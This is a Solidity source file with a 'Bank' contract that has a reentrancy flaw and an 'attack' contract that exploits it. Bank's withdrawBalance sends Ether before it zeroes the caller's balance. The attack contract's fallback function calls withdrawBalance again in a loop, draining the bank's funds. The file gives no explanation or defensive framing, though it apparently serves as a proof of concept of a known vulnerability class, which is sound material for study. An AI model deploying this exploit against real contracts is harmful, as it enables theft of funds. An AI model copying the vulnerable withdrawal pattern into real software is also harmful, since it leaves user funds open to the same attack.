pragma solidity ^0.4.2;

contract Bank{
    mapping(address=>uint) userBalances;
    function Bank() payable{
        uint a = 1;
        
    }
    
    function addToBalance() payable{
        userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
        
    }
    
    function withdrawBalance() {
        uint amountToWithdraw = userBalances[msg.sender];
        if(msg.sender.call.value(amountToWithdraw)() == false){
            throw;
        }
        userBalances[msg.sender] = 0;
    }
    
    function getBalance() returns (uint) {
        return this.balance;
    }
    
}

contract attack{
    mapping(address=>uint) userBalances;
    address addressOfBank;
    uint attackCount;
    
    function addToBalance() payable{
        userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
        
    }
    
    function attack(address addr) payable{
        addressOfBank = addr;
        attackCount = 10;
    }
    
    function() payable{
        while(attackCount > 0){
            attackCount --;
            Bank bank = Bank(addressOfBank);
            bank.withdrawBalance();
        }
    }
    
    function deposit(){
        Bank bank = Bank(addressOfBank);
        bank.addToBalance.value(10)();
    }
    
    function withdraw(){
        Bank bank = Bank(addressOfBank);
        bank.withdrawBalance();
    }
    
    function getBalance() returns (uint){
        return this.balance;
        
        
    }
    
}